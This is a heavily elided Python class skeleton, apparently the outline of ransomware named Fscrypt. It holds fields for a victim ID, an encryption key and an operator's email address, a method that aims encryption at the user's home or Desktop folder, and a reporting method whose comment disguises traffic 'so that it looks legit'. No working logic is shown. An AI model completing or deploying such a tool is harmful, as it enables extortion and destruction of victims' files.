...
class Fscrypt(object):
    ...
    def __init__(self):
        ...
        self.id_length   = 20          # size of identify code
        self.key_length  = 20          # size of key
        ...
        self.recipient  = "your@email.address"
        self.subject    = ''
        self.msg_cont   = ''
    ...
    def probe_OS(self, debug):
        ...
        if self.os_name == 'Linux':
            ...
            if debug is True: #here you need to specify the from root to home/Desktop directory
                self.path_enc += '/'
    ...
    def send_report(self):
        ...
        # Including headers(User-Agent) so that it looks legit, change it if you want to use other browser
